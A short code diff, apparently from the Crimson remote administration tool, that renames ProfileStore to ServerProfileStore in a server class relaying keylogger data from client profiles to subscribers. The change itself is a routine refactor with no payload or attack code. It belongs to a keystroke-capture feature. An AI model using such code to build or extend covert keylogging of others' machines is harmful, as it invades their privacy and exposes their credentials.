@@ -30,7 +30,7 @@ import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Stream.SubscriberParam;
 import com.subterranean_security.crimson.core.store.LcvidStore;
 import com.subterranean_security.crimson.core.util.IDGen;
-import com.subterranean_security.crimson.server.store.ProfileStore;
+import com.subterranean_security.crimson.server.store.ServerProfileStore;
 import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
 
@@ -51,7 +51,7 @@ public class SubscriberSlave extends Stream implements Observer {
 	public void start() {
 
 		if (param().getSubscriberParam().getKeylog()) {
-			ClientProfile cp = ProfileStore.getClient(param().getCID());
+			ClientProfile cp = ServerProfileStore.getClient(param().getCID());
 
 			if (cp != null) {
 				cp.getKeylog().addObserver(this);
@@ -65,7 +65,7 @@ public class SubscriberSlave extends Stream implements Observer {
 	@Override
 	public void stop() {
 		if (param().getSubscriberParam().getKeylog()) {
-			ClientProfile cp = ProfileStore.getClient(param().getCID());
+			ClientProfile cp = ServerProfileStore.getClient(param().getCID());
 
 			if (cp != null) {
 				cp.getKeylog().deleteObserver(this);
